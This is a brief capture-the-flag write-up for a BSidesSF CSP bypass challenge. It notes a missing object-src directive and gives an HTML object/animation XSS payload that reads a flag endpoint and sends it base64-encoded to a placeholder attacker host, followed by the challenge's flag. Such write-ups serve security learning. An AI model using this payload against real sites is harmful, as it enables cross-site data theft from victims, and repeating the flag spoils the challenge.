**Challenge**: https://csp-1-581db2b1.challenges.bsidessf.net/

CSP Evaluator: https://csp-evaluator.withgoogle.com/
- Interesting: `object-src [missing]`

Object payload:
```html
<style>@keyframes x{}</style><object style="animation-name:x" onanimationend="function reqListener () {window.location='<Your Host>/?a='+btoa(this.responseText);};oReq = new XMLHttpRequest();oReq.onload = reqListener;oReq.open('get', 'csp-one-flag', true);oReq.send();"></object>
```

Edit the host in `window.location` and send it in the challenge page. The request from Admin contains the flag in base64.

Reference: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

**Flag**: CTF{Can_Send_Payloads}
